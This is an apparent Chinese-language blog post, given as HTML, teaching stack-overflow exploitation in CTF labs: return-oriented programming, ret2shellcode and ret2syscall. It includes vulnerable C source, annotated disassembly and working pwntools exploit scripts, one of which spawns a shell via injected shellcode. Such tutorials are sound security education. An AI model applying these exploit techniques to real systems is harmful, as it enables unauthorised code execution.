@@ -1,0 +1,880 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>ROP基础 | 果汁天下苏&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="如何利用栈溢出漏洞">
+<meta name="author" content="果汁天下苏">
+<link rel="canonical" href="http://guozhi1.github.io/posts/pwn/aaaaa/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.css" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.js" onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="http://guozhi1.github.io/img/Q.gif">
+<link rel="icon" type="image/png" sizes="16x16" href="http://guozhi1.github.io/img/Q.gif">
+<link rel="icon" type="image/png" sizes="32x32" href="http://guozhi1.github.io/img/Q.gif">
+<link rel="apple-touch-icon" href="http://guozhi1.github.io/img/Q.gif">
+<link rel="mask-icon" href="http://guozhi1.github.io/img/Q.gif">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<script defer src="https://unpkg.com/mermaid@8.8.1/dist/mermaid.min.js"></script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.3/dist/jquery.min.js"></script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = ""; 
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<meta property="og:title" content="ROP基础" />
+<meta property="og:description" content="如何利用栈溢出漏洞" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://guozhi1.github.io/posts/pwn/aaaaa/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-15T14:59:44+08:00" />
+<meta property="article:modified_time" content="2023-11-15T14:59:44+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ROP基础"/>
+<meta name="twitter:description" content="如何利用栈溢出漏洞"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+
+        {
+          "@type": "ListItem",
+          "position":  2 ,
+          "name": "📚文章",
+          "item": "http://guozhi1.github.io/posts/"
+        },
+
+        {
+          "@type": "ListItem",
+          "position":  3 ,
+          "name": "🏖 pwn",
+          "item": "http://guozhi1.github.io/posts/pwn/"
+        }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "ROP基础",
+      "item": "http://guozhi1.github.io/posts/pwn/aaaaa/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ROP基础",
+  "name": "ROP基础",
+  "description": "如何利用栈溢出漏洞",
+  "keywords": [
+    ""
+  ],
+  "articleBody": "1. ROP介绍 栈溢出大家都打过吧， 栈溢出通过Ret返回到黑客输入的shellcode处执行。但是不是所有有栈溢出漏洞的程序都有写shellcode的权限。有的程序有但是Date段和Text段也不会有执行权限，这个时候就需要通过程序内中的已有的汇编指令来进行拼接实现Shellcode功能。\nroptest 1.1 题目分析 int main(){ char name[16]; read(0,name,128); } int foo(){ return open(\"/flag\", 0); } int bar(){ int x = open(\"/notflag\", 0); sendfile(1,x,0,1024); } read是一个溢出点，但是但是没有能直接读取/flag。 sendfile()可以但是读的变量 是x这个时候就需要通过 操控栈来让程序执行open(\"/flag\", 0) 之后可以通过sendfile() 函数来读取/flag\n像搭积木一样把函数再内存中进行拼装。\n编译它\ngcc -fno-stack-protector -no-pie -o roptest roptest.c 关闭了程序地址随机化(PIE) 关闭了金丝雀 这不是这期的重点，重点是学习ROP，不是绕过防御机制。\n攻击链路\n通过栈溢出 —\u003e 执行open(/flag) ret到 —\u003e sendfile() 函数 —\u003e 得到flag 文件\n这是objdump 反编译的重要函数 读注释的代码\n0000000000401176 : 401176:\tf3 0f 1e fa endbr64 40117a:\t55 push rbp //8个字节 40117b:\t48 89 e5 mov rbp,rsp 40117e:\t48 83 ec 10 sub rsp,0x10 401182:\t48 8d 45 f0 lea rax,[rbp-0x10] //Name变量 16 个字节 401186:\tba 80 00 00 00 mov edx,0x80 40118b:\t48 89 c6 mov rsi,rax 40118e:\tbf 00 00 00 00 mov edi,0x0 401193:\tb8 00 00 00 00 mov eax,0x0 401198:\te8 c3 fe ff ff call 401060 // 溢出点 8+16溢出点 40119d:\tb8 00 00 00 00 mov eax,0x0 4011a2:\tc9 leave 4011a3:\tc3 ret //跳到OPen(/flag ) 0x4011ac 00000000004011a4 : 4011a4:\tf3 0f 1e fa endbr64 4011a8:\t55 push rbp 4011a9:\t48 89 e5 mov rbp,rsp 4011ac:\tbe 00 00 00 00 mov esi,0x0 //open的0参数 4011b1:\t48 8d 3d 4c 0e 00 00 lea rdi,[rip+0xe4c] //这是/flag字符串 # 402004 \u003c_IO_stdin_used+0x4\u003e 4011b8:\tb8 00 00 00 00 mov eax,0x0 //预设返回值 4011bd:\te8 be fe ff ff call 401080 4011c2:\t5d pop rbp //做填充 4011c3:\tc3 ret // 跳转到0x4011ec sendfile函数来读取Flag 00000000004011c4 : 4011c4:\tf3 0f 1e fa endbr64 4011c8:\t55 push rbp 4011c9:\t48 89 e5 mov rbp,rsp 4011cc:\t48 83 ec 10 sub rsp,0x10 4011d0:\tbe 00 00 00 00 mov esi,0x0 4011d5:\t48 8d 3d 2e 0e 00 00 lea rdi,[rip+0xe2e] # 40200a \u003c_IO_stdin_used+0xa\u003e 4011dc:\tb8 00 00 00 00 mov eax,0x0 4011e1:\te8 9a fe ff ff call 401080 4011e6:\t89 45 fc mov DWORD PTR [rbp-0x4],eax 4011e9:\t8b 45 fc mov eax,DWORD PTR [rbp-0x4] 4011ec:\tb9 00 04 00 00 mov ecx,0x400 //0x400 = 1024 4011f1:\tba 00 00 00 00 mov edx,0x0 4011f6:\t89 c6 mov esi,eax 4011f8:\tbf 01 00 00 00 mov edi,0x1 4011fd:\tb8 00 00 00 00 mov eax,0x0 401202:\te8 69 fe ff ff call 401070 //执行到这个函数成功的读取Flag文件 401207:\t90 nop 401208:\tc9 leave 401209:\tc3 ret 40120a:\t66 0f 1f 44 00 00 nop WORD PTR [rax+rax*1+0x0] 2 EXP from pwn import * r = process(\"./RopTest\") r.send(#填充 name b\"a\"*16+ #填充 rbp b\"b\" * 8+ #填充 rip p64(0x4011ac)+ #填充 pop rbp b'c'*8+ # 填充 foo ret p64(0x4011ec) ) #print(r.readall()) r.interactive() ret2shellcode 1. 源码分析 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\"No system for you this time !!!\"); gets((char *)\u0026v4); //栈溢出点 strncpy(buf2, (const char *)\u0026v4, 0x64u); //shellcode 复制到Buf2 printf(\"bye bye ~\"); return 0; } 这道题是溢出写shellcode int v4是局部变量不会有固定的地址\nstrncpy 函数 0x804a080 的地址是buf2 变量的这样V4被复制到Buf2中shellcode就有了一个固定的地址\n8048598:\tc7 44 24 08 64 00 00 mov DWORD PTR [esp+0x8],0x64 804859f:\t00 80485a0:\t8d 44 24 1c lea eax,[esp+0x1c] 80485a4:\t89 44 24 04 mov DWORD PTR [esp+0x4],eax 80485a8:\tc7 04 24 80 a0 04 08 mov DWORD PTR [esp],0x804a080 80485af:\te8 6c fe ff ff call 8048420 2. 构建Exp v4 大小是100\n07:001c│ eax 0xffffd0dc ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' ... ↓ 24 skipped 20:0080│ edx 0xffffd140 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c 21:0084│-004 0xffffd144 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c 22:0088│ ebp 0xffffd148 ◂— 0x0 可以看到下面两位被got表占了不知道为什么 再填充 8byte 覆盖ebp 再加 4byte\n100 + 8 + 4 = 112 byte\nfrom pwn import * r = process('./ret2shellcode') raw_input() sddaddr = 0x804a080 shell = asm(shellcraft.sh()) print(len(shell)) print(shell.ljust(0x70,b'A')+p32(sddaddr)) r.recvuntil('!!!') r.sendline(shell.ljust(0x70,b'A')+p32(sddaddr)) r.interactive() 因为不知道shellcode的长度所以使用 ljust函数来填充如果shellcode长度不够就用A来填充\nret2syscall 1.1 源码分析 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\"This time, no system() and NO SHELLCODE!!!\"); puts(\"What do you plan to do?\"); gets(\u0026v4); return 0; } ",
+  "wordCount" : "1329",
+  "inLanguage": "en",
+  "datePublished": "2023-11-15T14:59:44+08:00",
+  "dateModified": "2023-11-15T14:59:44+08:00",
+  "author":[{
+    "@type": "Person",
+    "name": "果汁天下苏"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://guozhi1.github.io/posts/pwn/aaaaa/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "果汁天下苏's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://guozhi1.github.io/img/Q.gif"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    (function () {
+        let  arr,reg = new RegExp("(^| )"+"change-themes"+"=([^;]*)(;|$)");
+        if(arr = document.cookie.match(reg)) {
+        } else {
+            if (new Date().getHours() >= 19 || new Date().getHours() < 6) {
+                document.body.classList.add('dark');
+                localStorage.setItem("pref-theme", 'dark');
+            } else {
+                document.body.classList.remove('dark');
+                localStorage.setItem("pref-theme", 'light');
+            }
+        }
+    })()
+
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://guozhi1.github.io" accesskey="h" title="果汁天下苏 (Alt + H)">
+            <img src="http://guozhi1.github.io/img/Q.gif" alt="logo" aria-label="logo"
+                 height="35">果汁天下苏</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                         stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                         stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://guozhi1.github.io/search" title="🔍 搜索 (Alt &#43; /)" accesskey=/>
+                <span>🔍 搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://guozhi1.github.io/" title="🏠 主页">
+                <span>🏠 主页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://guozhi1.github.io/posts" title="📚 文章">
+                <span>📚 文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://guozhi1.github.io/tags" title="🧩 标签">
+                <span>🧩 标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://guozhi1.github.io/archives/" title="⏱️ 时间轴">
+                <span>⏱️ 时间轴</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://guozhi1.github.io/about" title="🙋🏻‍♂️ 关于">
+                <span>🙋🏻‍♂️ 关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://guozhi1.github.io/links" title="🤝 友链">
+                <span>🤝 友链</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main page">
+<style>
+    i[id*="post_meta_style"] {
+        display: flex;
+        align-items: center;
+        margin: 0 0 10px 0;
+    }
+</style>
+
+<article class="post-single">
+    <div id="single-content">
+        <header class="post-header">
+            <div class="breadcrumbs"><a href="http://guozhi1.github.io">🏠 主页</a>&nbsp;»&nbsp;<a href="http://guozhi1.github.io/posts/">📚文章</a>&nbsp;»&nbsp;<a href="http://guozhi1.github.io/posts/pwn/">🏖 pwn</a></div>
+            <h1 class="post-title">
+                ROP基础
+            </h1>
+            <div class="post-description">
+                如何利用栈溢出漏洞
+            </div>
+            <div class="post-meta">
+
+<style>
+    i[id*="post_meta_style"] {
+        display: flex;
+        align-items: center;
+        margin: 0 0 10px 0;
+    }
+
+    .parent-post-meta {
+        display: flex;
+        flex-wrap: wrap;
+        opacity: 0.8;
+    }
+</style>
+
+<span class="parent-post-meta">
+    <span id="post_meta_style_1">
+        <span class="fa fa-calendar-check-o"></span>
+        <span>2023-11-15
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    
+    
+    
+    
+    
+    
+    
+    <span id="post_meta_style_3">
+        <span class="fa fa-file-word-o"></span>
+        <span>1329字
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    <span id="post_meta_style_4">
+        <span class="fa fa-clock-o"></span>
+        <span>3分钟
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    <span id="post_meta_style_5">
+        <span class="fa fa-user-o"></span>
+        <span>果汁天下苏
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    <span id="post_meta_style_6">
+        <span class="fa fa-tags" style="opacity: 0.8"></span>
+        <span>
+            <span class="post-tags-meta">
+                <a href="http://guozhi1.github.io/tags/pwn/" style="color: var(--secondary)!important;">pwn</a>
+                &nbsp;<a href="http://guozhi1.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" style="color: var(--secondary)!important;">二进制</a>
+                &nbsp;<a href="http://guozhi1.github.io/tags/%E6%BC%8F%E6%B4%9E/" style="color: var(--secondary)!important;">漏洞</a>
+                &nbsp;<a href="http://guozhi1.github.io/tags/rop/" style="color: var(--secondary)!important;">ROP</a>
+                &nbsp;<a href="http://guozhi1.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="color: var(--secondary)!important;">栈溢出</a>
+            </span>
+        </span>
+    </span>
+</span>
+<span style="opacity: 0.8;">
+                    <span id="post_meta_style_7">
+                        &nbsp;&nbsp;
+                        <span class="fa fa-eye" ></span>
+                        <span>
+                            <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span></span>
+                            &nbsp;&nbsp;
+                        </span>
+                    </span>
+                    <span id="post_meta_style_8">
+                        <span class="fa fa-commenting-o"></span>
+                        <span>
+                            <script src="https://cdn.staticfile.org/twikoo/1.5.8/twikoo.all.min.js"></script>
+                            <script>
+                                let url = document.documentURI
+                                
+                                let dnsUrl = "http://guozhi1.github.io"
+                                let urlSplit = url.split(dnsUrl)
+                                let finalUrl = urlSplit[1]
+                                if (finalUrl[0] !== '/') {
+                                    finalUrl = '/'+finalUrl
+                                }
+                                twikoo.getCommentsCount({
+                                    envId:  null , 
+                                region:  null , 
+                                urls: [ 
+                                    
+                                    finalUrl,
+                                ],
+                                    includeReply: false 
+                                }).then(function (res) {
+                                    let count = res[0].count
+                                    const obj = document.getElementById("comment_count");
+                                    obj.innerText = count
+                                    
+                                    
+                                    
+                                }).catch(function (err) {
+                                    
+                                    console.error(err);
+                                });
+                            </script>
+                            <span id="comment_count"></span>
+                        </span>
+                    </span>
+                </span>
+
+</div>
+        </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">文章目录</span>
+        </summary>
+
+        <div class="inner"><ul><ul>
+                <li>
+                    <a href="#1-rop%e4%bb%8b%e7%bb%8d" aria-label="1. ROP介绍">1. ROP介绍</a></li></ul>
+                    
+                <li>
+                    <a href="#roptest" aria-label="roptest">roptest</a><ul>
+                        
+                <li>
+                    <a href="#11-%e9%a2%98%e7%9b%ae%e5%88%86%e6%9e%90" aria-label="1.1 题目分析">1.1 题目分析</a></li>
+                <li>
+                    <a href="#2-exp" aria-label="2 EXP">2 EXP</a></li></ul>
+                </li>
+                <li>
+                    <a href="#ret2shellcode" aria-label="ret2shellcode">ret2shellcode</a><ul>
+                        
+                <li>
+                    <a href="#1-%e6%ba%90%e7%a0%81%e5%88%86%e6%9e%90" aria-label="1. 源码分析">1. 源码分析</a></li>
+                <li>
+                    <a href="#2-%e6%9e%84%e5%bb%baexp" aria-label="2. 构建Exp">2. 构建Exp</a></li></ul>
+                </li>
+                <li>
+                    <a href="#ret2syscall" aria-label="ret2syscall">ret2syscall</a><ul>
+                        
+                <li>
+                    <a href="#11-%e6%ba%90%e7%a0%81%e5%88%86%e6%9e%90" aria-label="1.1 源码分析">1.1 源码分析</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    window.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        
+        activeElement = elements[0];
+        const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+        document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+    }, false);
+
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+
+    window.addEventListener('scroll', () => {
+        
+        activeElement = Array.from(elements).find((element) => {
+            if ((getOffsetTop(element) - window.pageYOffset) > 0 &&
+                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
+                return element;
+            }
+        }) || activeElement
+
+        elements.forEach(element => {
+            const id = encodeURI(element.getAttribute('id')).toLowerCase();
+            if (element === activeElement){
+                document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+            } else {
+                document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
+            }
+        })
+    }, false);
+
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;
+    }
+</script>
+        <div class="post-content"><h3 id="1-rop介绍">1. ROP介绍<a hidden class="anchor" aria-hidden="true" href="#1-rop介绍">#</a></h3>
+<p>栈溢出大家都打过吧， 栈溢出通过Ret返回到黑客输入的shellcode处执行。但是不是所有有栈溢出漏洞的程序都有写shellcode的权限。有的程序有但是Date段和Text段也不会有执行权限，这个时候就需要通过程序内中的已有的汇编指令来进行拼接实现Shellcode功能。</p>
+<h2 id="roptest">roptest<a hidden class="anchor" aria-hidden="true" href="#roptest">#</a></h2>
+<h3 id="11-题目分析">1.1 题目分析<a hidden class="anchor" aria-hidden="true" href="#11-题目分析">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">16</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,name,<span style="color:#ae81ff">128</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">foo</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/flag&#34;</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">bar</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> x <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/notflag&#34;</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sendfile</span>(<span style="color:#ae81ff">1</span>,x,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1024</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>read</code>是一个溢出点，但是但是没有能直接读取/flag。 sendfile()可以但是读的变量 是x这个时候就需要通过 操控栈来让程序执行<code>open(&quot;/flag&quot;, 0)</code> 之后可以通过<code>sendfile()</code> 函数来读取/flag</p>
+<p>像搭积木一样把函数再内存中进行拼装。</p>
+<p>编译它</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -fno-stack-protector -no-pie -o roptest roptest.c
+</span></span></code></pre></div><p>关闭了程序地址随机化(PIE)
+关闭了金丝雀
+这不是这期的重点，重点是学习ROP，不是绕过防御机制。</p>
+<p>攻击链路<br>
+通过栈溢出 &mdash;&gt; 执行open(/flag) ret到 &mdash;&gt; sendfile() 函数 &mdash;&gt; 得到flag 文件</p>
+<p>这是objdump 反编译的重要函数
+<em>读注释的代码</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0000000000401176 &lt;main&gt;:
+</span></span><span style="display:flex;"><span>  401176:	f3 0f 1e fa          	endbr64 
+</span></span><span style="display:flex;"><span>  40117a:	55                   	push   rbp   //8个字节
+</span></span><span style="display:flex;"><span>  40117b:	48 89 e5             	mov    rbp,rsp
+</span></span><span style="display:flex;"><span>  40117e:	48 83 ec 10          	sub    rsp,0x10
+</span></span><span style="display:flex;"><span>  401182:	48 8d 45 f0          	lea    rax,[rbp-0x10]  //Name变量  16 个字节
+</span></span><span style="display:flex;"><span>  401186:	ba 80 00 00 00       	mov    edx,0x80
+</span></span><span style="display:flex;"><span>  40118b:	48 89 c6             	mov    rsi,rax
+</span></span><span style="display:flex;"><span>  40118e:	bf 00 00 00 00       	mov    edi,0x0
+</span></span><span style="display:flex;"><span>  401193:	b8 00 00 00 00       	mov    eax,0x0
+</span></span><span style="display:flex;"><span>  401198:	e8 c3 fe ff ff       	call   401060 &lt;read@plt&gt; // 溢出点 8+16溢出点 
+</span></span><span style="display:flex;"><span>  40119d:	b8 00 00 00 00       	mov    eax,0x0
+</span></span><span style="display:flex;"><span>  4011a2:	c9                   	leave  
+</span></span><span style="display:flex;"><span>  4011a3:	c3                   	ret    //跳到OPen(/flag ) 0x4011ac
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>00000000004011a4 &lt;foo&gt;:
+</span></span><span style="display:flex;"><span>  4011a4:	f3 0f 1e fa          	endbr64 
+</span></span><span style="display:flex;"><span>  4011a8:	55                   	push   rbp
+</span></span><span style="display:flex;"><span>  4011a9:	48 89 e5             	mov    rbp,rsp
+</span></span><span style="display:flex;"><span>  4011ac:	be 00 00 00 00       	mov    esi,0x0   //open的0参数 
+</span></span><span style="display:flex;"><span>  4011b1:	48 8d 3d 4c 0e 00 00 	lea    rdi,[rip+0xe4c]  //这是/flag字符串     # 402004 &lt;_IO_stdin_used+0x4&gt;
+</span></span><span style="display:flex;"><span>  4011b8:	b8 00 00 00 00       	mov    eax,0x0  //预设返回值
+</span></span><span style="display:flex;"><span>  4011bd:	e8 be fe ff ff       	call   401080 &lt;open@plt&gt;
+</span></span><span style="display:flex;"><span>  4011c2:	5d                   	pop    rbp    //做填充
+</span></span><span style="display:flex;"><span>  4011c3:	c3                   	ret    // 跳转到0x4011ec sendfile函数来读取Flag 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>00000000004011c4 &lt;bar&gt;:
+</span></span><span style="display:flex;"><span>  4011c4:	f3 0f 1e fa          	endbr64 
+</span></span><span style="display:flex;"><span>  4011c8:	55                   	push   rbp
+</span></span><span style="display:flex;"><span>  4011c9:	48 89 e5             	mov    rbp,rsp
+</span></span><span style="display:flex;"><span>  4011cc:	48 83 ec 10          	sub    rsp,0x10
+</span></span><span style="display:flex;"><span>  4011d0:	be 00 00 00 00       	mov    esi,0x0
+</span></span><span style="display:flex;"><span>  4011d5:	48 8d 3d 2e 0e 00 00 	lea    rdi,[rip+0xe2e]        # 40200a &lt;_IO_stdin_used+0xa&gt;
+</span></span><span style="display:flex;"><span>  4011dc:	b8 00 00 00 00       	mov    eax,0x0
+</span></span><span style="display:flex;"><span>  4011e1:	e8 9a fe ff ff       	call   401080 &lt;open@plt&gt;
+</span></span><span style="display:flex;"><span>  4011e6:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax
+</span></span><span style="display:flex;"><span>  4011e9:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
+</span></span><span style="display:flex;"><span>  4011ec:	b9 00 04 00 00       	mov    ecx,0x400    //0x400 = 1024
+</span></span><span style="display:flex;"><span>  4011f1:	ba 00 00 00 00       	mov    edx,0x0
+</span></span><span style="display:flex;"><span>  4011f6:	89 c6                	mov    esi,eax
+</span></span><span style="display:flex;"><span>  4011f8:	bf 01 00 00 00       	mov    edi,0x1
+</span></span><span style="display:flex;"><span>  4011fd:	b8 00 00 00 00       	mov    eax,0x0
+</span></span><span style="display:flex;"><span>  401202:	e8 69 fe ff ff       	call   401070 &lt;sendfile@plt&gt;  //执行到这个函数成功的读取Flag文件
+</span></span><span style="display:flex;"><span>  401207:	90                   	nop
+</span></span><span style="display:flex;"><span>  401208:	c9                   	leave  
+</span></span><span style="display:flex;"><span>  401209:	c3                   	ret    
+</span></span><span style="display:flex;"><span>  40120a:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
+</span></span></code></pre></div><h3 id="2-exp">2 EXP<a hidden class="anchor" aria-hidden="true" href="#2-exp">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./RopTest&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(<span style="color:#75715e">#填充 name</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span><span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#填充 rbp </span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#填充 rip </span>
